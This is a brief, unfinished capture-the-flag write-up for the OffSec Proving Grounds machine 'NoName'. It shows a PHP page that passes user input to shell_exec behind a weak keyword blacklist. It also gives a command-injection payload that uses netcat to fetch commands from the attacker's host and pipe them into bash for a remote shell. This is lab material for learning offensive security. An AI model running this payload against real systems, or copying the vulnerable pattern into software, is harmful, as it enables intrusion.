Hello,

We are going to exploit one of [OffSec Proving Grounds](https://portal.offensive-security.com/proving-grounds/play) Medium machines which called `NoName` and this post is not a fully detailed walkthrough, I will just go through the important points during the exploit process.

## Enumeration:
- Nmap:

### Getting RCE:
- We can `ping` IPs on that page: http://noname.pg/superadmin.php
- Not all the commands we try to run  actually get executed on the target like `ls`:
![image](../../assets/img/sample/pg-noname/ls.png)

- But we can list the files on the current directory using `echo *`:

- Reading the source code of `superadmin.php` file:

```php
<?php
   if (isset($_POST['submitt']))
{
   	$word=array(";","&&","/","bin","&"," &&","ls","nc","dir","pwd");
   	$pinged=$_POST['pinger'];
   	$newStr = str_replace($word, "", $pinged);
   	if(strcmp($pinged, $newStr) == 0)
		{
		    $flag=1;
		}
       else
		{
		   $flag=0;
		}
}

if ($flag==1){
$outer=shell_exec("ping -c 3 $pinged");
echo "<pre>$outer</pre>";
}
?>
```
* As you can see there's a blacklist commands that we can't use: `";","&&","/","bin","&"," &&","ls","nc","dir","pwd"`

- Let's get a shell:
1. Create a local file with a payload to be executed on the target, then passing that file to a netcat listener:

2. Connecting to our netcat from the remote target and passing the output to bash:
    > The payload: ```||netcat 192.168.49.137 9090|`which bash` ```

3. We Got a shell:

## Privilege Escalation:
